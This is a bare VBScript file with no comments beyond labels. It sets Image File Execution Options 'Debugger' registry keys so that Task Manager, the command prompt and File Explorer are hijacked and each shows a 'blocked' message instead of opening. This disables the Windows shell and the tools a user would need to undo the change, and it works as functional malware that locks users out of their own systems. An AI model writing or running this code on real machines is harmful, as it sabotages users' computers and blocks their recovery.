Set WshShell = CreateObject("WScript.Shell")

' Block Task Manager
key = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe\Debugger"
WshShell.RegWrite key, "C:\Windows\System32\msg.exe * Task Manager is blocked!", "REG_SZ"

' Block Command Prompt
key = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe\Debugger"
WshShell.RegWrite key, "C:\Windows\System32\msg.exe * Command Prompt is blocked!", "REG_SZ"

' Block File Explorer
key = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe\Debugger"
WshShell.RegWrite key, "C:\Windows\System32\msg.exe * File Explorer is blocked!", "REG_SZ"
